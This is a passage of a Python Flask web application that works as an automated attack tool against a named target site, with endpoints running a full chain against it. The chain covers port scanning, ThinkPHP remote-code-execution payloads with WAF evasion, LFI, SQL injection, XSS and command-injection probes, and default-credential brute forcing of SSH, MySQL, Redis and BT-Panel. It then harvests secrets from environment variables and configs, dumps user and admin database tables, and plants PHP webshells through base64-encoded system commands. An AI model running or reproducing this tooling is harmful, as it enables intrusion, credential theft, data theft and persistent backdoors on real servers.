        (445, 'SMB'), (465, 'SMTPS'), (514, 'Syslog'),
        (587, 'SMTP-Submission'), (993, 'IMAPS'), (995, 'POP3S'),
        (1080, 'SOCKS'), (1433, 'MSSQL'), (1521, 'Oracle'),
        (1723, 'PPTP'), (2049, 'NFS'), (2082, 'cPanel'),
        (2083, 'cPanel-SSL'), (2086, 'WHM'), (2087, 'WHM-SSL'),
        (2095, 'Webmail'), (2096, 'Webmail-SSL'),
        (2222, 'DirectAdmin'), (2483, 'Oracle-SSL'),
        (3128, 'Squid'), (3306, 'MySQL'), (3389, 'RDP'),
        (4444, 'Metasploit'), (4848, 'GlassFish'),
        (5432, 'PostgreSQL'), (5555, 'Android-Debug'),
        (5900, 'VNC'), (5984, 'CouchDB'), (6379, 'Redis'),
        (7001, 'WebLogic'), (7002, 'WebLogic-SSL'),
        (8000, 'HTTP-Alt'), (8009, 'AJP'),
        (8080, 'HTTP-Proxy'), (8089, 'Splunk'),
        (8181, 'HTTP-Alt'), (8443, 'HTTPS-Alt'),
        (8888, 'BT-Panel'), (888, 'BT-Panel-Old'),
        (9000, 'PHP-FPM'), (9001, 'Supervisor'),
        (9043, 'WebSphere'), (9090, 'Cockpit'),
        (9200, 'Elasticsearch'), (9300, 'Elasticsearch-Node'),
        (9999, 'HTTP-Alt'), (10000, 'Webmin'),
        (11211, 'Memcached'), (15672, 'RabbitMQ'),
        (27017, 'MongoDB'), (27018, 'MongoDB-Shard'),
        (28017, 'MongoDB-Web'), (50000, 'SAP'),
        (50030, 'Hadoop'), (50070, 'Hadoop-Web'),
        (61616, 'ActiveMQ'),
    ]
    
    results = []
    
    def scan_port(port, service):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_IP, port))
            
            if result == 0:
                banner = None
                http_info = None
                
                try:
                    http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    http_sock.settimeout(3)
                    http_sock.connect((TARGET_IP, port))
                    http_sock.send(f'GET / HTTP/1.0\r\nHost: {TARGET_IP}\r\n\r\n'.encode())
                    banner_data = http_sock.recv(4096).decode('utf-8', errors='ignore')
                    http_sock.close()
                    
                    status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', banner_data)
                    server_match = re.search(r'Server:\s*(.+)', banner_data, re.IGNORECASE)
                    title_match = re.search(r'<title>(.*?)</title>', banner_data, re.IGNORECASE)
                    
                    http_info = {
                        'status': int(status_match.group(1)) if status_match else None,
                        'server': server_match.group(1).strip() if server_match else None,
                        'title': title_match.group(1) if title_match else None,
                    }
                    banner = banner_data[:500]
                except:
                    try:
                        banner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        banner_sock.settimeout(3)
                        banner_sock.connect((TARGET_IP, port))
                        banner_sock.settimeout(2)
                        banner = banner_sock.recv(1024).decode('utf-8', errors='ignore')[:500]
                        banner_sock.close()
                    except:
                        pass
                
                sock.close()
                
                port_info = {
                    'port': port,
                    'service': service,
                    'open': True,
                    'banner': banner,
                    'http_info': http_info,
                    'ip': TARGET_IP,
                }
                
                add_to_attack_state('open_ports', [f"{port}/{service}"])
                add_to_attack_state('open_ports_detailed', [port_info])
                
                return port_info
            else:
                sock.close()
                return {'port': port, 'service': service, 'open': False}
        except Exception as e:
            return {'port': port, 'service': service, 'open': False, 'error': str(e)}
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(scan_port, port, service) for port, service in ports_to_scan]
        for future in as_completed(futures):
            result = future.result()
            if result['open']:
                results.append(result)
    
    results.sort(key=lambda x: x['port'])
    return jsonify(results)

# ============================================================
# ENHANCED RCE PAYLOADS WITH WAF BYPASS
# ============================================================
@app.route('/hunt/rce-payloads')
def rce_payloads():
    """Comprehensive RCE payload testing with WAF bypass"""
    payloads = [
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname -a',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=hostname',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /www/wwwroot/',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat -tlnp',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ps aux',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/etc/passwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/www/wwwroot/',
    ]
    
    results = []
    
    def test_payload(payload):
        # Try normal request
        try:
            r = requests.get(f"{TARGET}{payload}", timeout=20, verify=False,
                           headers={'User-Agent': get_random_user_agent()})
            increment_request_count()
            
            blocked = is_waf_blocked(r.text, r.status_code)
            
            if blocked:
                # Try with WAF evasion
                r = waf_evasion_request(f"{TARGET}{payload}", method='GET')
                if r:
                    blocked = is_waf_blocked(r.text, r.status_code)
            
            is_rce = False
            indicators = []
            
            if r and r.status_code == 200 and len(r.text) > 20 and not blocked:
                body_lower = r.text.lower()
                
                if 'uid=' in r.text and 'gid=' in r.text:
                    indicators.append('Unix ID output')
                    is_rce = True
                if 'root:' in r.text and ('/bin/bash' in r.text or '/bin/sh' in r.text):
                    indicators.append('Passwd file')
                    is_rce = True
                if 'php version' in body_lower or 'phpinfo' in body_lower:
                    indicators.append('PHP Info')
                    is_rce = True
                if 'total' in body_lower and ('drwx' in r.text or '-rw' in r.text):
                    indicators.append('Directory listing')
                    is_rce = True
                if 'tcp' in body_lower and 'listen' in body_lower:
                    indicators.append('Netstat output')
                    is_rce = True
                
                if 'password' in body_lower or 'passwd' in body_lower:
                    creds = re.findall(r'(?:password|passwd|pwd)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
                    if creds:
                        add_to_attack_state('discovered_credentials', creds)
            
            if is_rce:
                attack_state['rce_verified'] = True
                attack_state['rce_payloads_working'].append(payload)
                attack_state['successful_exploits'] += 1
                add_to_attack_state('vulnerable_params', [payload])
            
            return {
                'payload': payload,
                'status': r.status_code if r else 0,
                'length': len(r.text) if r else 0,
                'blocked_by_waf': blocked,
                'rce_verified': is_rce,
                'indicators': indicators,
                'snippet': r.text[:2000] if r else 'Request failed'
            }
        except Exception as e:
            return {'payload': payload, 'error': str(e)}
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_payload, p) for p in payloads]
        for future in as_completed(futures):
            results.append(future.result())
    
    if attack_state['rce_verified']:
        threading.Thread(target=_deep_rce_exploitation_async).start()
    
    return jsonify(results)

def _deep_rce_exploitation_async():
    """Background deep RCE exploitation"""
    def exploit():
        commands = [
            'whoami', 'id', 'uname -a', 'hostname', 'pwd',
            'cat /etc/passwd', 'cat /etc/hosts',
            'ls -la /www/wwwroot/',
            'find /www -name "*.php" -o -name "*.env" -o -name "*.conf" 2>/dev/null | head -50',
            'ps aux | grep -E "mysql|redis|nginx|apache|php"',
            'netstat -tlnp',
            'env | grep -E "PASS|SECRET|KEY|TOKEN|DB|DATABASE"',
        ]
        
        for cmd in commands:
            try:
                payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
                r = waf_evasion_request(f"{TARGET}{payload}", method='GET')
                
                if r and r.status_code == 200 and len(r.text) > 20:
                    creds = re.findall(r'(?:password|passwd|pwd|secret|token|key)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
                    if creds:
                        add_to_attack_state('discovered_credentials', creds)
                    
                    ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', r.text)
                    if ips:
                        add_to_attack_state('open_ports', [f"{ip}/unknown" for ip in ips[:10]])
            except:
                pass
        
        attack_state['current_shell'] = 'ThinkPHP RCE'
    threading.Thread(target=exploit).start()

# ============================================================
# VULNERABILITY SCANNING
# ============================================================
@app.route('/hunt/lfi-scan')
def lfi_scan():
    """Comprehensive LFI scanning"""
    lfi_payloads = [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd',
        'php://filter/convert.base64-encode/resource=index',
        'php://filter/convert.base64-encode/resource=config/database',
    ]
    
    results = []
    test_params = ['file', 'page', 'path', 'include', 'document', 'folder', 'template', 'lang', 'locale']
    
    for endpoint in attack_state['discovered_endpoints'][:20]:
        for param in test_params:
            for payload in lfi_payloads[:6]:
                try:
                    url = f"{TARGET}{endpoint}?{param}={payload}"
                    r = waf_evasion_request(url, method='GET')
                    if r:
                        if 'root:' in r.text or 'www-data' in r.text:
                            results.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'vulnerable': True,
                                'evidence': r.text[:500]
                            })
                            add_to_attack_state('lfi_vulnerabilities', [f"{endpoint}?{param}={payload}"])
                except:
                    pass
    
    return jsonify({'results': results, 'total': len(results)})

@app.route('/hunt/sqli-scan')
def sqli_scan():
    """Comprehensive SQL injection scanning"""
    sqli_payloads = [
        ("'", "Generic quote"),
        ("' OR '1'='1", "OR injection"),
        ("' OR '1'='1' --", "OR with comment"),
        ("admin' --", "Admin bypass"),
        ("' UNION SELECT NULL--", "Union select"),
    ]
    
    results = []
    test_params = ['id', 'page', 'user', 'product', 'article', 'news', 'cat', 'category', 'item', 'view']
    
    for endpoint in attack_state['discovered_endpoints'][:20]:
        for param in test_params:
            for payload, description in sqli_payloads[:5]:
                try:
                    url = f"{TARGET}{endpoint}?{param}={urllib.parse.quote(payload)}"
                    r = requests.get(url, timeout=10, verify=False, 
                                   headers={'User-Agent': get_random_user_agent()})
                    increment_request_count()
                    
                    body_lower = r.text.lower()
                    sql_errors = [
                        'sql syntax', 'mysql_fetch', 'mysql error',
                        'unclosed quotation mark', 'unknown column',
                        'where clause', 'syntax error',
                    ]
                    
                    for error in sql_errors:
                        if error in body_lower:
                            results.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'type': description,
                                'vulnerable': True,
                                'error_indicator': error
                            })
                            add_to_attack_state('sqli_vulnerabilities', [f"{endpoint}?{param}={payload}"])
                            break
                except:
                    pass
    
    return jsonify({'results': results, 'total': len(results)})

@app.route('/hunt/xss-scan')
def xss_scan():
    """XSS vulnerability scanning"""
    xss_payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
    ]
    
    results = []
    test_params = ['q', 'search', 'query', 'id', 'name', 'email', 'message', 'comment']
    
    for endpoint in attack_state['discovered_endpoints'][:15]:
        for param in test_params:
            for payload in xss_payloads[:4]:
                try:
                    url = f"{TARGET}{endpoint}?{param}={urllib.parse.quote(payload)}"
                    r = requests.get(url, timeout=10, verify=False,
                                   headers={'User-Agent': get_random_user_agent()})
                    increment_request_count()
                    
                    if payload in r.text:
                        results.append({
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'reflected': True
                        })
                        add_to_attack_state('xss_vulnerabilities', [f"{endpoint}?{param}={payload}"])
                except:
                    pass
    
    return jsonify({'results': results, 'total': len(results)})

# ============================================================
# FULL AUTOMATED ATTACK CHAIN
# ============================================================
@app.route('/auto-attack/full-scan')
def full_auto_scan():
    """Execute complete automated attack lifecycle"""
    attack_state['scan_start_time'] = datetime.now().isoformat()
    
    results = {
        'phase1_recon': {},
        'phase2_discovery': {},
        'phase3_vulnerability': {},
        'phase4_exploitation': {},
        'phase5_post_exploitation': {},
    }
    
    # Phase 1: Reconnaissance
    results['phase1_recon'] = {
        'waf_detection': waf_detect().get_json(),
        'port_scan': _scan_all_ports(),
        'header_analysis': _check_headers_internal(),
        'technology_detection': _detect_technologies(),
    }
    
    # Phase 2: Discovery
    results['phase2_discovery'] = {
        'backup_scan': _scan_backups_comprehensive(),
        'git_scan': _scan_git_comprehensive(),
        'file_discovery': _discover_sensitive_files(),
        'admin_panel_finder': _find_admin_panels(),
    }
    
    # Phase 3: Vulnerability Assessment
    results['phase3_vulnerability'] = {
        'config_extraction': _extract_all_configs(),
        'cookie_testing': _comprehensive_cookie_test(),
        'lfi_testing': lfi_scan().get_json(),
        'sqli_testing': sqli_scan().get_json(),
        'xss_testing': xss_scan().get_json(),
        'ssrf_testing': _test_all_ssrf(),
        'command_injection': _test_command_injection(),
    }
    
    # Phase 4: Exploitation
    if attack_state['open_ports'] or attack_state['waf_detected']:
        results['phase4_exploitation'] = {
            'waf_bypass_test': waf_bypass_test().get_json() if attack_state['waf_detected'] else {},
            'service_exploitation': _exploit_all_services(),
            'rce_payloads': rce_payloads().get_json(),
            'bt_panel_attack': _attack_bt_panel_comprehensive(),
        }
    
    # Phase 5: Post-Exploitation
    if attack_state['rce_verified'] or attack_state['discovered_credentials']:
        results['phase5_post_exploitation'] = {
            'webshell_deployment': _deploy_webshells(),
            'database_extraction': _extract_all_database_data(),
        }
    
    attack_state['scan_end_time'] = datetime.now().isoformat()
    
    return jsonify({
        'scan_complete': True,
        'results': results,
        'attack_state_summary': {
            'waf_detected': attack_state['waf_detected'],
            'waf_type': attack_state['waf_type'],
            'waf_bypasses': attack_state['waf_bypass_successful'],
            'rce_achieved': attack_state['rce_verified'],
            'services_compromised': len(attack_state['database_info']),
            'credentials_found': len(attack_state['discovered_credentials']),
            'total_requests': attack_state['total_requests_sent'],
        }
    })

# ============================================================
# INTERNAL SCANNING FUNCTIONS
# ============================================================
def _scan_all_ports():
    common_ports = [
        (21, 'FTP'), (22, 'SSH'), (25, 'SMTP'), (53, 'DNS'),
        (80, 'HTTP'), (110, 'POP3'), (143, 'IMAP'), (443, 'HTTPS'),
        (3306, 'MySQL'), (3389, 'RDP'), (5432, 'PostgreSQL'),
        (6379, 'Redis'), (8080, 'HTTP-Alt'), (8443, 'HTTPS-Alt'),
        (8888, 'BT Panel'), (27017, 'MongoDB'),
    ]
    
    open_ports = []
    for port, service in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_IP, port))
            sock.close()
            if result == 0:
                open_ports.append({'port': port, 'service': service})
                add_to_attack_state('open_ports', [f"{port}/{service}"])
        except:
            pass
    return open_ports

def _check_headers_internal():
    try:
        r = requests.get(TARGET, timeout=10, verify=False)
        increment_request_count()
        return {
            'headers': dict(r.headers),
            'server': r.headers.get('Server', 'Unknown'),
            'x_powered_by': r.headers.get('X-Powered-By', 'Unknown')
        }
    except:
        return {'error': 'Failed'}

def _detect_technologies():
    try:
        r = requests.get(TARGET, timeout=10, verify=False,
                        headers={'User-Agent': get_random_user_agent()})
        increment_request_count()
        tech = {}
        body = r.text.lower()
        tech['PHP'] = '.php' in str(r.url) or 'php' in r.headers.get('X-Powered-By', '').lower()
        tech['ThinkPHP'] = 'thinkphp' in body or 'think\\' in body
        tech['Vue.js'] = 'vue' in body or 'v-bind' in body
        tech['jQuery'] = 'jquery' in body
        tech['Nginx'] = 'nginx' in r.headers.get('Server', '').lower()
        add_to_attack_state('tech_stack', [k for k, v in tech.items() if v])
        return {'technologies': tech}
    except:
        return {'error': 'Failed'}

def _scan_backups_comprehensive():
    backup_patterns = [
        'backup.zip', 'backup.tar.gz', 'backup.sql',
        'www.zip', 'site.zip', '.env', '.env.backup',
        'config.php.bak', 'database.php.bak', 'dump.sql',
    ]
    found = []
    for pattern in backup_patterns:
        try:
            r = requests.get(f"{TARGET}/{pattern}", timeout=10, verify=False)
            increment_request_count()
            if r.status_code == 200:
                found.append({'file': pattern, 'size': len(r.text)})
                add_to_attack_state('backup_files', [pattern])
        except:
            pass
    return found

def _scan_git_comprehensive():
    git_paths = [
        '/.git/HEAD', '/.git/config', '/.git/index',
    ]
    found = []
    for path in git_paths:
        try:
            r = requests.get(f"{TARGET}{path}", timeout=10, verify=False)
            increment_request_count()
            if r.status_code == 200:
                found.append({'path': path, 'size': len(r.text)})
                add_to_attack_state('git_files', [path])
        except:
            pass
    return found

def _discover_sensitive_files():
    sensitive_files = [
        '/robots.txt', '/sitemap.xml', '/.env', '/.htaccess',
        '/phpinfo.php', '/info.php', '/test.php',
        '/admin.php', '/config.php', '/composer.json',
    ]
    found = []
    for file in sensitive_files:
        try:
            r = requests.get(f"{TARGET}{file}", timeout=10, verify=False)
            increment_request_count()
            if r.status_code == 200:
                found.append({'file': file, 'size': len(r.text)})
                add_to_attack_state('discovered_files', [file])
        except:
            pass
    return found

def _find_admin_panels():
    admin_paths = [
        '/admin', '/administrator', '/wp-admin', '/login',
        '/admin/login', '/dashboard', '/panel', '/manage',
    ]
    found = []
    for path in admin_paths:
        try:
            r = requests.get(f"{TARGET}{path}", timeout=10, verify=False, allow_redirects=False)
            increment_request_count()
            if r.status_code in [200, 301, 302, 403]:
                found.append({'path': path, 'status': r.status_code})
        except:
            pass
    return found

def _extract_all_configs():
    config_paths = [
        '/index.php?s=index/think\\config/get&name=database',
        '/index.php?s=index/think\\config/get&name=app',
    ]
    results = []
    for path in config_paths:
        try:
            r = waf_evasion_request(f"{TARGET}{path}", method='GET')
            if r and r.status_code == 200:
                creds = re.findall(r'(?:password|passwd|pwd|secret|key|token)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
                if creds:
                    add_to_attack_state('discovered_credentials', creds)
                results.append({'path': path, 'credentials_found': len(creds)})
        except:
            pass
    return results

def _comprehensive_cookie_test():
    cookie_values = [
        'admin', 'root', 'administrator', '1', 'true',
        'Marufbelay', '', "' or '1'='1",
    ]
    results = []
    for val in cookie_values:
        try:
            encoded = base64.b64encode(val.encode()).decode()
            r = requests.get(f"{TARGET}/index.php", cookies={'username': encoded}, timeout=10, verify=False)
            increment_request_count()
            results.append({
                'value': val,
                'status': r.status_code,
                'length': len(r.text),
            })
        except:
            pass
    return results

def _test_all_ssrf():
    ssrf_payloads = [
        'http://127.0.0.1', 'http://localhost',
        'file:///etc/passwd',
    ]
    results = []
    for endpoint in attack_state['discovered_endpoints'][:10]:
        for payload in ssrf_payloads[:3]:
            try:
                r = requests.get(f"{TARGET}{endpoint}?url={payload}", timeout=10, verify=False)
                increment_request_count()
                if r.status_code == 200 and len(r.text) > 50:
                    results.append({'endpoint': endpoint, 'payload': payload})
            except:
                pass
    return results

def _test_command_injection():
    cmd_payloads = ['; whoami', '| whoami', '&& whoami', '; id', '&& id']
    results = []
    for endpoint in attack_state['discovered_endpoints'][:10]:
        for payload in cmd_payloads[:5]:
            try:
                r = requests.get(f"{TARGET}{endpoint}?cmd={urllib.parse.quote(payload)}", timeout=10, verify=False)
                increment_request_count()
                if 'root' in r.text or 'www-data' in r.text or 'uid=' in r.text:
                    results.append({'endpoint': endpoint, 'payload': payload, 'vulnerable': True})
            except:
                pass
    return results

def _exploit_all_services():
    results = {}
    for port_info in attack_state['open_ports_detailed']:
        port = port_info['port']
        if port == 22 and PARAMIKO_AVAILABLE:
            results['ssh'] = _try_ssh_bruteforce_internal()
        elif port == 21:
            results['ftp'] = _try_ftp_anonymous_internal()
        elif port == 3306 and PYMYSQL_AVAILABLE:
            results['mysql'] = _try_mysql_default_internal()
        elif port == 6379 and REDIS_AVAILABLE:
            results['redis'] = _try_redis_unauth_internal()
        elif port in [8888, 888]:
            results['bt_panel'] = _attack_bt_panel_internal()
    return results

def _try_ssh_bruteforce_internal():
    common_creds = [('root', 'root'), ('root', 'admin'), ('root', '123456')]
    for username, password in common_creds:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(TARGET_IP, port=22, username=username, password=password, timeout=5)
            ssh.close()
            creds = f"{username}:{password}"
            add_to_attack_state('discovered_credentials', [creds])
            attack_state['successful_exploits'] += 1
            return {'success': True, 'credentials': creds}
        except:
            pass
    return {'success': False}

def _try_ftp_anonymous_internal():
    try:
        ftp = ftplib.FTP()
        ftp.connect(TARGET_IP, 21, timeout=5)
        ftp.login('anonymous', 'anonymous')
        files = ftp.nlst()[:20]
        ftp.quit()
        add_to_attack_state('discovered_credentials', ['anonymous:anonymous'])
        attack_state['successful_exploits'] += 1
        return {'success': True, 'files': files}
    except:
        return {'success': False}

def _try_mysql_default_internal():
    try:
        conn = pymysql.connect(host=TARGET_IP, port=3306, user='root', password='', connect_timeout=5)
        cursor = conn.cursor()
        cursor.execute("SELECT VERSION()")
        version = cursor.fetchone()
        cursor.execute("SHOW DATABASES")
        databases = [db[0] for db in cursor.fetchall()]
        conn.close()
        add_to_attack_state('database_info', {'type': 'mysql', 'version': str(version), 'databases': databases})
        attack_state['successful_exploits'] += 1
        return {'success': True, 'databases': databases}
    except:
        return {'success': False}

def _try_redis_unauth_internal():
    try:
        r = redis.Redis(host=TARGET_IP, port=6379, socket_timeout=5)
        r.ping()
        keys = [k.decode() for k in r.keys('*')[:20]]
        add_to_attack_state('database_info', {'type': 'redis', 'keys': keys})
        attack_state['successful_exploits'] += 1
        return {'success': True, 'keys': keys}
    except:
        return {'success': False}

def _attack_bt_panel_internal():
    bt_creds = [('admin', 'admin'), ('admin', '123456'), ('admin', 'admin123')]
    for port in [8888, 888]:
        for username, password in bt_creds:
            try:
                session = requests.Session()
                r = session.get(f"http://{TARGET_IP}:{port}/login", timeout=5)
                r = session.post(f"http://{TARGET_IP}:{port}/login", 
                               data={'username': username, 'password': password}, timeout=5)
                if 'dashboard' in r.text.lower() or 'success' in r.text.lower():
                    creds = f"bt_panel:{username}:{password}"
                    add_to_attack_state('discovered_credentials', [creds])
                    attack_state['bt_panel_url'] = f"http://{TARGET_IP}:{port}"
                    attack_state['bt_panel_credentials'] = creds
                    attack_state['successful_exploits'] += 1
                    return {'success': True, 'credentials': creds}
            except:
                pass
    return {'success': False}

def _attack_bt_panel_comprehensive():
    return _attack_bt_panel_internal()

def _extract_all_database_data():
    return _full_database_extraction_sync()

def _full_database_extraction_sync():
    results = {}
    if 'mysql' in str(attack_state['database_info']).lower() and PYMYSQL_AVAILABLE:
        try:
            conn = pymysql.connect(host=TARGET_IP, port=3306, user='root', password='', connect_timeout=5)
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            databases = cursor.fetchall()
            for db in databases[:5]:
                db_name = db[0]
                try:
                    cursor.execute(f"USE {db_name}")
                    cursor.execute("SHOW TABLES")
                    tables = cursor.fetchall()
                    for table in tables[:10]:
                        table_name = table[0]
                        if any(t in table_name.lower() for t in ['user', 'admin', 'member', 'account', 'config']):
                            try:
                                cursor.execute(f"SELECT * FROM {table_name} LIMIT 5")
                                rows = cursor.fetchall()
                                columns = [desc[0] for desc in cursor.description]
                                results[f"{db_name}.{table_name}"] = {
                                    'columns': columns,
                                    'sample': str(rows)[:500]
                                }
                            except:
                                pass
                except:
                    pass
            conn.close()
        except:
            pass
    return results

def _deploy_webshells():
    results = []
    if attack_state['rce_verified']:
        webshells = [
            ('shell.php', '<?php @eval($_POST["cmd"]); ?>'),
            ('shell2.php', '<?php system($_GET["cmd"]); ?>'),
        ]
        for filename, code in webshells:
            encoded_code = base64.b64encode(code.encode()).decode()
            cmd = f'echo {encoded_code} | base64 -d > /www/wwwroot/invest307.fa/{filename}'
            try:
                payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={urllib.parse.quote(cmd)}"
                r = waf_evasion_request(f"{TARGET}{payload}", method='GET')
                if r:
                    verify = requests.get(f"{TARGET}/{filename}", timeout=5)
                    if verify.status_code == 200:
                        results.append({'webshell': f"{TARGET}/{filename}", 'status': 'deployed'})
                        add_to_attack_state('webshell_locations', [f"{TARGET}/{filename}"])
            except:
                pass
    return results

# ============================================================
# ADDITIONAL ENDPOINTS
# ============================================================
@app.route('/hunt/thinkphp-config')
def thinkphp_config():
    return jsonify(_extract_all_configs())

@app.route('/hunt/git-leak')
def git_leak():
    return jsonify(_scan_git_comprehensive())

@app.route('/hunt/backup-files')
def backup_files():
    return jsonify(_scan_backups_comprehensive())

@app.route('/hunt/bt-panel')
def bt_panel_check():
    return jsonify(_attack_bt_panel_internal())

@app.route('/hunt/headers')
def check_headers():
    return jsonify(_check_headers_internal())

@app.route('/hunt/vue-routes')
def test_vue_routes():
    routes = [
        '/index.html#/login', '/index.html#/register/1',
        '/index.html#/wallet', '/index.html#/recharge',
        '/index.html#/user', '/index.html#/admin',
    ]
    results = []
    for route in routes:
        try:
            r = requests.get(f"{TARGET}{route}", timeout=10, verify=False, allow_redirects=False)
            increment_request_count()
            results.append({
                'route': route,
                'status': r.status_code,
                'accessible': r.status_code == 200
            })
        except:
            pass
    return jsonify(results)

@app.route('/hunt/desktop-bypass')
def desktop_bypass():
    try:
        mobile_r = requests.get(TARGET, headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}, timeout=10, verify=False)
        desktop_r = requests.get(TARGET, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=10, verify=False)
        increment_request_count()
        increment_request_count()
        return jsonify({
            'mobile_length': len(mobile_r.text),
            'desktop_length': len(desktop_r.text),
            'different': len(mobile_r.text) != len(desktop_r.text),
        })
    except:
        return jsonify({'error': 'Failed'})

@app.route('/test/cookie/<value>')
def test_cookie(value):
    encoded = base64.b64encode(value.encode()).decode()
    try:
        r = requests.get(f"{TARGET}/index.php", cookies={'username': encoded}, timeout=10, verify=False)
        increment_request_count()
        return jsonify({
            'value_tested': value,
            'encoded_cookie': encoded,
            'status': r.status_code,
            'length': len(r.text),
        })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/hunt/cookie-fuzz')
def cookie_fuzz():
    return jsonify(_comprehensive_cookie_test())

# ============================================================
# HEALTH CHECK
# ============================================================
@app.route('/health')
def health():
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.now().isoformat(),
        'target': TARGET,
        'target_ip': TARGET_IP,
        'waf_status': {
            'detected': attack_state['waf_detected'],
            'type': attack_state['waf_type'],
            'bypasses': attack_state['waf_bypass_successful'],
        },
        'attack_state_summary': {
            'total_requests': attack_state['total_requests_sent'],
            'rce_achieved': attack_state['rce_verified'],
            'open_ports': len(attack_state['open_ports']),
            'successful_exploits': attack_state['successful_exploits'],
            'modules_available': {
                'paramiko': PARAMIKO_AVAILABLE,
                'pymysql': PYMYSQL_AVAILABLE,
                'redis': REDIS_AVAILABLE,
                'pymongo': PYMONGO_AVAILABLE,
                'psycopg2': PSYCOPG2_AVAILABLE,
                'ftplib': FTP_AVAILABLE,
            }
        }
    })

@app.route('/clear-cache')
def clear_cache():
    cache.clear()
    return jsonify({'message': 'Cache cleared'})

# ============================================================
# STARTUP - RENDER COMPATIBLE
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print(f"Server starting on port {port}")
    print(f"Target: {TARGET}")
    print(f"Target IP: {TARGET_IP}")
    app.run(host='0.0.0.0', port=port, debug=False)
